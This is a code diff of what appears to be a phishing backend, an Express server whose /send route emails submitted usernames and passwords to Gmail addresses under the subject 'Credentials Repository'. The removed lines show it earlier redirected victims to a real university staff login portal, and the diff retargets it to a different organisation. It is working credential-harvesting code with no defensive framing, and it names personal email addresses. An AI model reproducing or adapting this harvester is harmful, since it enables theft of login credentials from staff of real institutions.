@@ -31,7 +31,7 @@ app.get('/',(req, res) => {
 app.post('/send',(req, res) => {
 	console.log(req.body)
 	const output = `
-		<p>You have a new password entry from KU</p>
+		<p>You have a new password entry from CMA</p>
 		<h3>User Details</h3>
 		<ul>
 			<li>Name: ${req.body.username}</li>
@@ -56,7 +56,7 @@ app.post('/send',(req, res) => {
     // setup email data with unicode symbols
     let mailOptions = {
         from: '"Serianu Password Repository" <momanyisamuel48@gmail.com>', // sender address
-        to: 'markmuema2@gmail.com, momanyisamuel48@gmail.com', // list of receivers
+        to: 'momanyisamuel48@gmail.com', // list of receivers
         subject: 'Credentials Repository', // Subject line
         text: 'New Password Crendetial', // plain text body
         html: output // html body
@@ -74,7 +74,7 @@ app.post('/send',(req, res) => {
         // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
         // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
 
-        res.redirect('https://portal.ku.ac.ke/secure/staff/loginsta.aspx?ReturnURL=/secure/staff/staff.aspx')
+        res.redirect('/')
     });
 })
 
